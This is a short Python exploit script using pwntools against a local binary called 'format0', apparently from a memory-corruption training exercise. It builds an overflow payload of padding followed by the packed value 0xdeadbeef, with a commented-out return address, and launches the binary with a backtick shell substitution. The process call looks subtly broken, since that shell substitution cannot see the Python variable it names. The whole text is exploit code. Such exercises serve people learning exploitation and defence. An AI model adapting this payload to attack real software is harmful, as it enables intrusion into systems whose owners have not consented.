from pwn import *

BIN = "./format0"

payload = b"A"*64 + b"B"*12 + p32(0xdeadbeef) #+ b"CCCC" + p32(0x000000000040057c)

io = process(BIN,"`python -c 'print(payload)'`")
io.interactive()